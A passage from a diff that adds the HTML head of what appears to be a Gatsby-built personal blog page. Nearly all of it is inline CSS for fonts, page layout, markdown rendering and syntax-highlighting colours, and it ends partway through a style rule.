@@ -1,0 +1,818 @@
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.58c7447b9282ecfbd3c6.css" data-identity="gatsby-global-css">@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:100;src:local("Montserrat Thin "),local("Montserrat-Thin"),url(/static/montserrat-latin-100-8d7d79679b70dbe27172b6460e7a7910.woff2) format("woff2"),url(/static/montserrat-latin-100-ec38980a9e0119a379e2a9b3dbb1901a.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:100;src:local("Montserrat Thin italic"),local("Montserrat-Thinitalic"),url(/static/montserrat-latin-100italic-e279051046ba1286706adc886cf1c96b.woff2) format("woff2"),url(/static/montserrat-latin-100italic-3b325a3173c8207435cd1b76e19bf501.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:200;src:local("Montserrat Extra Light "),local("Montserrat-Extra Light"),url(/static/montserrat-latin-200-9d266fbbfa6cab7009bd56003b1eeb67.woff2) format("woff2"),url(/static/montserrat-latin-200-2d8ba08717110d27122e54c34b8a5798.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:200;src:local("Montserrat Extra Light italic"),local("Montserrat-Extra Lightitalic"),url(/static/montserrat-latin-200italic-6e5b3756583bb2263eb062eae992735e.woff2) format("woff2"),url(/static/montserrat-latin-200italic-a0d6f343e4b536c582926255367a57da.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:300;src:local("Montserrat Light "),local("Montserrat-Light"),url(/static/montserrat-latin-300-00b3e893aab5a8fd632d6342eb72551a.woff2) format("woff2"),url(/static/montserrat-latin-300-ea303695ceab35f17e7d062f30e0173b.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:300;src:local("Montserrat Light italic"),local("Montserrat-Lightitalic"),url(/static/montserrat-latin-300italic-56f34ea368f6aedf89583d444bbcb227.woff2) format("woff2"),url(/static/montserrat-latin-300italic-54b0bf2c8c4c12ffafd803be2466a790.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:400;src:local("Montserrat Regular "),local("Montserrat-Regular"),url(/static/montserrat-latin-400-b71748ae4f80ec8c014def4c5fa8688b.woff2) format("woff2"),url(/static/montserrat-latin-400-0659a9f4e90db5cf51b50d005bff1e41.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:400;src:local("Montserrat Regular italic"),local("Montserrat-Regularitalic"),url(/static/montserrat-latin-400italic-6eed6b4cbb809c6efc7aa7ddad6dbe3e.woff2) format("woff2"),url(/static/montserrat-latin-400italic-7583622cfde30ae49086d18447ab28e7.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:500;src:local("Montserrat Medium "),local("Montserrat-Medium"),url(/static/montserrat-latin-500-091b209546e16313fd4f4fc36090c757.woff2) format("woff2"),url(/static/montserrat-latin-500-edd311588712a96bbf435fad264fff62.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:500;src:local("Montserrat Medium italic"),local("Montserrat-Mediumitalic"),url(/static/montserrat-latin-500italic-c90ced68b46050061d1a41842d6dfb43.woff2) format("woff2"),url(/static/montserrat-latin-500italic-5146cbfe02b1deea5dffea27a5f2f998.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:600;src:local("Montserrat SemiBold "),local("Montserrat-SemiBold"),url(/static/montserrat-latin-600-0480d2f8a71f38db8633b84d8722e0c2.woff2) format("woff2"),url(/static/montserrat-latin-600-b77863a375260a05dd13f86a1cee598f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:600;src:local("Montserrat SemiBold italic"),local("Montserrat-SemiBolditalic"),url(/static/montserrat-latin-600italic-cf46ffb11f3a60d7df0567f8851a1d00.woff2) format("woff2"),url(/static/montserrat-latin-600italic-c4fcfeeb057724724097167e57bd7801.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:700;src:local("Montserrat Bold "),local("Montserrat-Bold"),url(/static/montserrat-latin-700-7dbcc8a5ea2289d83f657c25b4be6193.woff2) format("woff2"),url(/static/montserrat-latin-700-99271a835e1cae8c76ef8bba99a8cc4e.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:700;src:local("Montserrat Bold italic"),local("Montserrat-Bolditalic"),url(/static/montserrat-latin-700italic-c41ad6bdb4bd504a843d546d0a47958d.woff2) format("woff2"),url(/static/montserrat-latin-700italic-6779372f04095051c62ed36bc1dcc142.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:800;src:local("Montserrat ExtraBold "),local("Montserrat-ExtraBold"),url(/static/montserrat-latin-800-db9a3e0ba7eaea32e5f55328ace6cf23.woff2) format("woff2"),url(/static/montserrat-latin-800-4e3c615967a2360f5db87d2f0fd2456f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:800;src:local("Montserrat ExtraBold italic"),local("Montserrat-ExtraBolditalic"),url(/static/montserrat-latin-800italic-bf45bfa14805969eda318973947bc42b.woff2) format("woff2"),url(/static/montserrat-latin-800italic-fe82abb0bcede51bf724254878e0c374.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:900;src:local("Montserrat Black "),local("Montserrat-Black"),url(/static/montserrat-latin-900-e66c7edc609e24bacbb705175669d814.woff2) format("woff2"),url(/static/montserrat-latin-900-8211f418baeb8ec880b80ba3c682f957.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:900;src:local("Montserrat Black italic"),local("Montserrat-Blackitalic"),url(/static/montserrat-latin-900italic-4454c775e48152c1a72510ceed3603e2.woff2) format("woff2"),url(/static/montserrat-latin-900italic-efcaa0f6a82ee0640b83a0916e6e8d68.woff) format("woff")}.search-input-wrapper{align-items:center;display:none;margin-top:3px;width:180px}@media(min-width:768px){.search-input-wrapper{display:flex}}.search-icon{color:var(--primary-text-color);margin-right:2px}.search-input{height:100%;width:100%}.search-input .MuiAutocomplete-inputRoot{padding-right:0!important}.search-input .MuiInputBase-input{color:var(--primary-text-color)!important;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;font-weight:500;padding-bottom:2px!important}.search-input .MuiInput-underline:before{border-bottom-width:1px}.search-input .MuiInput-underline:after,.search-input .MuiInput-underline:before{border-bottom-color:var(--primary-text-color)}.page-header-wrapper{display:flex;height:60px;justify-content:center;width:100%}.page-header-wrapper .page-header{align-items:center;display:flex;justify-content:space-between;max-width:720px;width:100%}.page-header-wrapper .page-header .link{color:var(--primary-text-color);font-size:17px;font-weight:700}@media(min-width:768px){.page-header-wrapper .page-header .link{font-size:20px;font-weight:700}}.page-header-wrapper .page-header .trailing-section{align-items:center;display:flex}.page-header-wrapper .page-header .trailing-section .link{margin-right:10px}@media(min-width:768px){.page-header-wrapper .page-header .trailing-section .link{margin-right:20px}}.page-footer-wrapper{align-items:center;display:flex;height:62px;justify-content:center;margin-top:auto;width:100%}.page-footer-wrapper .page-footer{max-width:720px;text-align:center;width:100%}.page-footer-wrapper .page-footer .link{color:var(--primary-text-color);font-size:20px;font-weight:700;margin-right:20px}.page-footer-wrapper .page-footer a{color:#3a95ff}.dark-mode-button-wrapper{align-items:center;bottom:20px;display:flex;justify-content:center;position:fixed;right:20px}.dark-mode-button{-webkit-backdrop-filter:blur(30px);backdrop-filter:blur(30px);background-color:#363f47!important;border-radius:50px;box-shadow:0 5px 25px rgba(0,0,0,.12);cursor:pointer;height:50px;width:50px;z-index:3}.dark-mode-icon{color:#fff}a,abbr,acronym,address,applet,article,aside,audio,b,big,blockquote,body,canvas,caption,center,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,html,i,iframe,img,ins,kbd,label,legend,li,mark,menu,nav,object,ol,output,p,pre,q,ruby,s,samp,section,small,span,strike,strong,sub,summary,sup,table,tbody,td,tfoot,th,thead,time,tr,tt,u,ul,var,video{border:0;font-size:100%;font:inherit;margin:0;padding:0;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:after,blockquote:before,q:after,q:before{content:"";content:none}table{border-collapse:collapse;border-spacing:0}a{outline:none;text-decoration:none}html{--background-color:#fff;--primary-text-color:#000;--secondary-text-color:#9e9e9e;--content-text-color:#37352f;--button-background-color:#f3f3f4;--button-text-color:#363f47;--tab-text-color:#6e6d7a;--tab-hover-text-color:#0d0c22;--tab-selected-background-color:rgba(13,12,34,.05);--bio-link-icon-color:rgba(0,0,0,.54);--about-link-icon-color:#a8a8a8;--chip-background-color:#f3f3f4;--link-text-color:rgba(55,53,47,.7);--post-card-border-color:rgba(0,0,0,.12);--markdown-table-even-cell-background-color:#f6f8fa;--markdown-table-border-color:#dfe2e5;--markdown-blockquote-border-color:#dfe2e5;--markdown-border-color:#e1e4e8}html[data-theme=dark]{--background-color:#232326;--primary-text-color:#e6e6e6;--secondary-text-color:#768390;--content-text-color:#e6e6e6;--button-background-color:#444c56;--button-text-color:#363f47;--tab-text-color:#768390;--tab-hover-text-color:#acbac7;--tab-selected-background-color:#373e47;--chip-background-color:#323a42;--bio-link-icon-color:#e6e6e6;--about-link-icon-color:#a8a8a8;--link-text-color:#90b0ec;--post-card-border-color:#363f47;--markdown-table-even-cell-background-color:#2d333b;--markdown-table-border-color:#444c56;--markdown-blockquote-border-color:#4f5864;--markdown-border-color:#e1e4e8}*{-webkit-appearance:none;appearance:none;box-sizing:border-box}html{font-size:14px;height:100%;overflow-y:scroll;width:100%}body{background-color:var(--background-color)!important}a{color:var(--link-text-color)}.page-wrapper{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;color:var(--primary-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;justify-content:center;min-height:100vh;padding-left:15px;padding-right:15px;word-break:keep-all}.page-wrapper,.page-wrapper .page-content{align-items:center;display:flex;flex-direction:column;width:100%}.page-wrapper .page-content{max-width:720px}.icon{color:var(--about-link-icon-color);font-size:20px}.social-links .icon{color:var(--bio-link-icon-color);font-size:30px}@keyframes blinking-cursor{0%{opacity:0}50%{opacity:1}to{opacity:0}}.bio{color:var(--primary-text-color);display:flex;flex-direction:column;justify-content:space-between;margin-bottom:120px;margin-top:120px;width:100%}@media(min-width:768px){.bio{align-items:center;flex-direction:row}}.bio .introduction{display:flex;flex-direction:column;word-break:keep-all}.bio .introduction .react-rotating-text-cursor{animation:blinking-cursor .8s cubic-bezier(.68,.01,.01,.99) 0s infinite}.bio .introduction strong{display:inline-block;font-weight:600}.bio .introduction.korean{font-size:32px;font-weight:100;line-height:1.2}.bio .introduction.korean .title .react-rotating-text-cursor{font-size:35px;line-height:35px}@media(min-width:768px){.bio .introduction.korean{font-size:40px}.bio .introduction.korean .title .react-rotating-text-cursor{font-size:45px;line-height:45px}}.bio .introduction.english{font-family:montserrat;font-size:25px;line-height:1.2}@media(min-width:768px){.bio .introduction.english{font-size:45px}}.bio .introduction.english .name{font-size:35px;font-weight:600}.bio .introduction.english .job{font-size:35px}.bio .introduction.english .description{font-size:20px;font-weight:200;margin-top:8px}.bio .introduction.english .social-links{display:flex;margin-top:20px}.bio .thumbnail{display:none;width:250px}@media(min-width:768px){.bio .thumbnail{display:block}}.section-header-wrapper{display:flex;justify-content:center;margin-bottom:32px;width:100%}.section-header-wrapper .section-header{border-bottom:4px solid var(--primary-text-color);color:var(--primary-text-color);font-size:30px;font-weight:700;padding-bottom:5px}.timestamp-section{align-items:center;display:flex;flex-direction:column;justify-content:center;margin-bottom:50px;width:100%;word-break:keep-all}.timestamp-section .body{padding:0 10px;width:100%}.timestamp-section .body .timestamp{border-left:2px solid #bdbdbd;display:flex;font-size:18px;font-weight:400;justify-items:center;margin-left:5px;padding:10px 0;width:100%}.timestamp-section .body .timestamp:first-child{padding-top:7px}.timestamp-section .body .timestamp:last-child{padding-bottom:7px}.timestamp-section .body .timestamp:before{align-self:center;background-color:var(--background-color);border:2px solid #828282;border-radius:10px;content:"";height:10px;left:-1px;position:relative;transform:translatex(-50%);width:10px}.timestamp-section .body .timestamp .date{align-self:center;color:#828282;margin-left:5px;margin-right:5px;min-width:115px;width:115px}@media(min-width:768px){.timestamp-section .body .timestamp .date{min-width:200px;width:200px}}.timestamp-section .body .timestamp .activity{line-height:23px;width:100%}.project-section{align-items:center;justify-content:center}.project-section,.project-section .project{display:flex;flex-direction:column;width:100%}.project-section .project{margin-bottom:30px;padding:15px}.project-section .project .head{font-size:20px;font-weight:700;line-height:30px;margin-bottom:10px}.project-section .project .body{display:flex;flex-direction:column;width:100%}.project-section .project .body .thumbnail{margin-bottom:10px;width:100%}.project-section .project .body .tech-stack{display:flex;margin-bottom:10px}.project-section .project .body .tech-stack .tech{background-color:var(--chip-background-color);border-radius:10px;font-size:15px;font-weight:500;margin-right:5px;padding:5px 7px}.project-section .project .body .description{font-size:16px;font-weight:400;line-height:1.4}@media(min-width:768px){.project-section .project .body{flex-direction:column}.project-section .project .body .content{margin-top:0}}.post-header{border-bottom:1px solid var(--post-card-border-color);display:flex;flex-direction:column;justify-content:center;margin-bottom:40px;margin-top:20px;padding-bottom:10px;width:100%;word-break:keep-all}.post-header .emoji{font-size:78px;margin-bottom:20px}.post-header .categories{margin-bottom:5px}.post-header .categories .category{color:var(--primary-text-color);font-weight:600;margin-right:4px}.post-header .categories .category:hover{text-decoration:underline}.post-header .title{color:var(--primary-text-color);font-size:32px;font-weight:600;line-height:1.3;margin-bottom:6px}.post-header .info{color:var(--secondary-text-color);display:flex;flex-wrap:wrap;font-size:16px;font-weight:500;line-height:1.5;width:100%}.post-header .info .author{margin-right:4px}.post-header .info strong{color:var(--primary-text-color);font-weight:600}.post-navigator{column-gap:1.4%;display:grid;grid-template-columns:49.3% 49.3%;width:100%}.post-navigator .post-card{border:1px solid var(--post-card-border-color);border-radius:6px;color:var(--primary-text-color);cursor:pointer;display:flex;flex-direction:column;padding:15px;transition:transform .2s;width:100%}.post-navigator .post-card:hover .title{text-decoration:underline}.post-navigator .post-card.prev{margin-right:auto}.post-navigator .post-card.next{margin-left:auto}.post-navigator .post-card .direction{color:gray;font-size:14px;font-weight:500;margin-bottom:5px}.post-navigator .post-card .title{font-size:16px;font-weight:600;line-height:1.4;margin-bottom:7px}.markdown .octicon{fill:currentColor;display:inline-block;vertical-align:text-bottom}.markdown .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown .anchor:focus{outline:none}.markdown h1 .octicon-link,.markdown h2 .octicon-link,.markdown h3 .octicon-link,.markdown h4 .octicon-link,.markdown h5 .octicon-link,.markdown h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown h1:hover .anchor,.markdown h2:hover .anchor,.markdown h3:hover .anchor,.markdown h4:hover .anchor,.markdown h5:hover .anchor,.markdown h6:hover .anchor{text-decoration:none}.markdown h1:hover .anchor .octicon-link,.markdown h2:hover .anchor .octicon-link,.markdown h3:hover .anchor .octicon-link,.markdown h4:hover .anchor .octicon-link,.markdown h5:hover .anchor .octicon-link,.markdown h6:hover .anchor .octicon-link{visibility:visible}.markdown h1:hover .anchor .octicon-link:before,.markdown h2:hover .anchor .octicon-link:before,.markdown h3:hover .anchor .octicon-link:before,.markdown h4:hover .anchor .octicon-link:before,.markdown h5:hover .anchor .octicon-link:before,.markdown h6:hover .anchor .octicon-link:before{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true' viewBox='0 0 16 16'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E");content:" ";display:inline-block;height:16px;width:16px}.markdown{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;word-wrap:break-word;color:var(--content-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;font-weight:500;line-height:1.5}.markdown details{display:block}.markdown summary{display:list-item}.markdown a{background-color:initial}.markdown a:active,.markdown a:hover{outline-width:0}.markdown strong{font-weight:inherit;font-weight:bolder}.markdown h1{margin:.67em 0}.markdown img{border-style:none}.markdown code,.markdown kbd,.markdown pre{font-family:monospace,monospace;font-size:1em}.markdown hr{box-sizing:initial;overflow:visible}.markdown input{font:inherit;margin:0;overflow:visible}.markdown [type=checkbox]{box-sizing:border-box;padding:0}.markdown *{box-sizing:border-box}.markdown input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown a{border-bottom:.05em solid;border-bottom-color:var(--link-text-color);border-left-color:var(--link-text-color);border-right-color:var(--link-text-color);border-top-color:var(--link-text-color);color:var(--link-text-color);text-decoration:none}.markdown a.anchor{border-bottom:none}.markdown strong{font-weight:700}.markdown hr{background:transparent;border-bottom:1px solid var(--markdown-blockquote-border-color);height:0;margin:15px 0;overflow:hidden}.markdown hr:after,.markdown hr:before{content:"";display:table}.markdown hr:after{clear:both}.markdown table{border-collapse:collapse;border-spacing:0}.markdown td,.markdown th{padding:0}.markdown details summary{cursor:pointer}.markdown h1,.markdown h2,.markdown h3,.markdown h4,.markdown h5,.markdown h6{margin-bottom:0;margin-top:0}.markdown h1{font-size:32px}.markdown h1,.markdown h2{font-weight:600}.markdown h2{font-size:24px}.markdown h3{font-size:20px}.markdown h3,.markdown h4{font-weight:600}.markdown h4{font-size:16px}.markdown h5{font-size:14px}.markdown h5,.markdown h6{font-weight:600}.markdown h6{font-size:12px}.markdown p{margin-bottom:10px;margin-top:0}.markdown blockquote{margin:0}.markdown ol,.markdown ul{margin-bottom:0;margin-top:0;padding-left:0}.markdown ol ol,.markdown ul ol{list-style-type:lower-roman}.markdown ol ol ol,.markdown ol ul ol,.markdown ul ol ol,.markdown ul ul ol{list-style-type:lower-alpha}.markdown dd{margin-left:0}.markdown code,.markdown pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown code.language-text{border-radius:3px;font-size:85%;padding:.2em .4em}.markdown :not(pre)>code.language-text{background:hsla(44,6%,50%,.15);color:#eb5757;overflow-wrap:break-word}.markdown pre{margin-bottom:0;margin-top:0}.markdown input::-webkit-inner-spin-button,.markdown input::-webkit-outer-spin-button{-webkit-appearance:none;appearance:none;margin:0}.markdown :checked+.radio-label{border-color:#0366d6;position:relative;z-index:1}.markdown .border{border:1px solid var(--markdown-border-color)!important}.markdown .border-0{border:0!important}.markdown .border-bottom{border-bottom:1px solid var(--markdown-border-color)!important}.markdown .rounded-1{border-radius:3px!important}.markdown .bg-white{background-color:transparent!important}.markdown .bg-gray-light{background-color:#fafbfc!important}.markdown .text-gray-light{color:#6a737d!important}.markdown .pl-3,.markdown .px-3{padding-left:16px!important}.markdown .px-3{padding-right:16px!important}.markdown .f6{font-size:12px!important}.markdown .lh-condensed{line-height:1.25!important}.markdown .text-bold{font-weight:600!important}.markdown .pl-c{color:#6a737d}.markdown .pl-c1,.markdown .pl-s .pl-v{color:#005cc5}.markdown .pl-e,.markdown .pl-en{color:#6f42c1}.markdown .pl-s .pl-s1,.markdown .pl-smi{color:#24292e}.markdown .pl-ent{color:#22863a}.markdown .pl-k{color:#d73a49}.markdown .pl-pds,.markdown .pl-s,.markdown .pl-s .pl-pse .pl-s1,.markdown .pl-sr,.markdown .pl-sr .pl-cce,.markdown .pl-sr .pl-sra,.markdown .pl-sr .pl-sre{color:#032f62}.markdown .pl-smw,.markdown .pl-v{color:#e36209}.markdown .pl-bu{color:#b31d28}.markdown .pl-ii{background-color:#b31d28;color:#fafbfc}.markdown .pl-c2{background-color:#d73a49;color:#fafbfc}.markdown .pl-c2:before{content:"^M"}.markdown .pl-sr .pl-cce{color:#22863a;font-weight:700}.markdown .pl-ml{color:#735c0f}.markdown .pl-mh,.markdown .pl-mh .pl-en,.markdown .pl-ms{color:#005cc5;font-weight:700}.markdown .pl-mi{color:#24292e;font-style:italic}.markdown .pl-mb{color:#24292e;font-weight:700}.markdown .pl-md{background-color:#ffeef0;color:#b31d28}.markdown .pl-mi1{background-color:#f0fff4;color:#22863a}.markdown .pl-mc{background-color:#ffebda;color:#e36209}.markdown .pl-mi2{background-color:#005cc5;color:#f6f8fa}.markdown .pl-mdr{color:#6f42c1;font-weight:700}.markdown .pl-ba{color:#586069}.markdown .pl-sg{color:#959da5}.markdown .pl-corl{color:#032f62;text-decoration:underline}.markdown .mb-0{margin-bottom:0!important}.markdown .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown .pl-0{padding-left:0!important}.markdown .py-0{padding-bottom:0!important;padding-top:0!important}.markdown .pl-1{padding-left:4px!important}.markdown .pl-2{padding-left:8px!important}.markdown .py-2{padding-bottom:8px!important;padding-top:8px!important}.markdown .pl-3{padding-left:16px!important}.markdown .pl-4{padding-left:24px!important}.markdown .pl-5{padding-left:32px!important}.markdown .pl-6{padding-left:40px!important}.markdown .pl-7{padding-left:48px!important}.markdown .pl-8{padding-left:64px!important}.markdown .pl-9{padding-left:80px!important}.markdown .pl-10{padding-left:96px!important}.markdown .pl-11{padding-left:112px!important}.markdown .pl-12{padding-left:128px!important}.markdown hr{border-bottom-color:#eee}.markdown kbd{background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da;color:#444d56;display:inline-block;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;padding:3px 5px;vertical-align:middle}.markdown:after,.markdown:before{content:"";display:table}.markdown:after{clear:both}.markdown>:first-child{margin-top:0!important}.markdown>:last-child{margin-bottom:0!important}.markdown a:not([href]){color:inherit;text-decoration:none}.markdown blockquote,.markdown details,.markdown dl,.markdown ol,.markdown p,.markdown pre,.markdown table,.markdown ul{margin-bottom:16px;margin-top:0}.markdown hr{background-color:var(--markdown-border-color);border:0;height:.25em;margin:24px 0;padding:0}.markdown blockquote{border-left:.25em solid var(--markdown-blockquote-border-color);color:#6a737d;padding:0 1em}.markdown blockquote>:first-child{margin-top:0}.markdown blockquote>:last-child{margin-bottom:0}.markdown h1,.markdown h2,.markdown h3,.markdown h4,.markdown h5,.markdown h6{font-weight:600;line-height:1.25;margin-bottom:16px;margin-top:24px}.markdown h1{font-size:2em}.markdown h2{font-size:1.5em}.markdown h3{font-size:1.25em}.markdown h4{font-size:1em}.markdown h5{font-size:.875em}.markdown h6{color:#6a737d;font-size:.85em}.markdown ol,.markdown ul{padding-left:2em}.markdown ol ol,.markdown ol ul,.markdown ul ol,.markdown ul ul{margin-bottom:0;margin-top:0}.markdown ol{list-style-type:decimal}.markdown ul{list-style-type:disc}.markdown li{word-wrap:break-all;display:list-item;text-align:-webkit-match-parent}.markdown li>p{margin-top:16px}.markdown li+li{margin-top:.25em}.markdown dl{padding:0}.markdown dl dt{font-size:1em;font-style:italic;font-weight:600;margin-top:16px;padding:0}.markdown dl dd{margin-bottom:16px;padding:0 16px}.markdown table{display:block;overflow:auto;width:100%}.markdown table th{font-weight:600}.markdown table td,.markdown table th{border:1px solid var(--markdown-table-border-color);padding:6px 13px}.markdown table tr{border-top:1px solid var(--markdown-table-border-color)}.markdown table tr:nth-child(2n){background-color:var(--markdown-table-even-cell-background-color)}.markdown img{background-color:transparent;box-sizing:initial;display:block;margin:0 auto;max-width:100%}.markdown img[align=right]{padding-left:20px}.markdown img[align=left]{padding-right:20px}.markdown code{background-color:rgba(27,31,35,.05);border-radius:3px;font-size:85%;margin:0;padding:.2em .4em}.markdown pre{word-wrap:normal}.markdown pre>code{background:transparent;border:0;font-size:100%;margin:0;padding:0;white-space:pre;word-break:normal}.markdown .highlight{margin-bottom:16px}.markdown .highlight pre{margin-bottom:0;word-break:normal}.markdown .highlight pre,.markdown pre{background-color:#f6f8fa;border-radius:3px;font-size:85%;line-height:1.45;overflow:auto;padding:16px}.markdown pre code{word-wrap:normal;background-color:initial;border:0;display:inline;line-height:inherit;margin:0;max-width:auto;overflow:visible;padding:0}.markdown .commit-tease-sha{color:#444d56;display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%}.markdown .full-commit .btn-outline:not(:disabled):hover{border-color:#005cc5;color:#005cc5}.markdown .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown .blob-num{color:rgba(27,31,35,.3);cursor:pointer;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;min-width:50px;padding-left:10px;padding-right:10px;text-align:right;-webkit-user-select:none;-ms-user-select:none;user-select:none;vertical-align:top;white-space:nowrap;width:1%}.markdown .blob-num:hover{color:rgba(27,31,35,.6)}.markdown .blob-num:before{content:attr(data-line-number)}.markdown .blob-code{line-height:20px;padding-left:10px;padding-right:10px;position:relative;vertical-align:top}.markdown .blob-code-inner{word-wrap:normal;color:#24292e;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;overflow:visible;white-space:pre}.markdown .pl-token.active,.markdown .pl-token:hover{background:#ffea7f;cursor:pointer}.markdown .tab-size[data-tab-size="1"]{-moz-tab-size:1;-o-tab-size:1;tab-size:1}.markdown .tab-size[data-tab-size="2"]{-moz-tab-size:2;-o-tab-size:2;tab-size:2}.markdown .tab-size[data-tab-size="3"]{-moz-tab-size:3;-o-tab-size:3;tab-size:3}.markdown .tab-size[data-tab-size="4"]{-moz-tab-size:4;-o-tab-size:4;tab-size:4}.markdown .tab-size[data-tab-size="5"]{-moz-tab-size:5;-o-tab-size:5;tab-size:5}.markdown .tab-size[data-tab-size="6"]{-moz-tab-size:6;-o-tab-size:6;tab-size:6}.markdown .tab-size[data-tab-size="7"]{-moz-tab-size:7;-o-tab-size:7;tab-size:7}.markdown .tab-size[data-tab-size="8"]{-moz-tab-size:8;-o-tab-size:8;tab-size:8}.markdown .tab-size[data-tab-size="9"]{-moz-tab-size:9;-o-tab-size:9;tab-size:9}.markdown .tab-size[data-tab-size="10"]{-moz-tab-size:10;-o-tab-size:10;tab-size:10}.markdown .tab-size[data-tab-size="11"]{-moz-tab-size:11;-o-tab-size:11;tab-size:11}.markdown .tab-size[data-tab-size="12"]{-moz-tab-size:12;-o-tab-size:12;tab-size:12}.markdown .task-list-item{list-style-type:none}.markdown .task-list-item+.task-list-item{margin-top:3px}.markdown .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}.markdown .table-of-contents{align-items:flex-start;display:flex;flex-direction:column;justify-content:center;position:fixed;right:0;top:75px;width:340px}@media(max-width:1300px){.markdown .table-of-contents{display:none}}.markdown .table-of-contents ul{cursor:pointer;list-style-type:none}.markdown .table-of-contents ul li a{border-bottom:none;color:var(--secondary-text-color);font-size:14px;height:30px;padding:6px 2px;width:100%}.markdown .table-of-contents ul p{margin:0}.markdown .gatsby-resp-image-wrapper{display:flex!important;justify-content:center!important;max-height:560px!important;width:100%!important}.markdown .gatsby-resp-image-wrapper img{height:auto!important;max-height:560px!important;max-width:100%!important;position:relative!important;width:auto!important}.markdown .gatsby-resp-image-wrapper+em{color:#6a737d;display:block;font-size:15px;font-style:italic;text-align:center}code[class*=language-],pre[class*=language-]{word-wrap:normal;background:none;color:#ccc;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;text-align:left;white-space:pre;word-break:normal;word-spacing:normal}pre[class*=language-]{margin:.5em 0;overflow:auto;padding:1em}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{border-radius:.3em;padding:.1em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}.post-content{margin-bottom:20px;width:100%}.category-page-header-wrapper,.post-content{display:flex;flex-direction:column;justify-content:center}.category-page-header-wrapper{align-items:center;margin-bottom:30px;margin-top:30px}.category-page-header-wrapper .category-page-title{border-bottom:3px solid 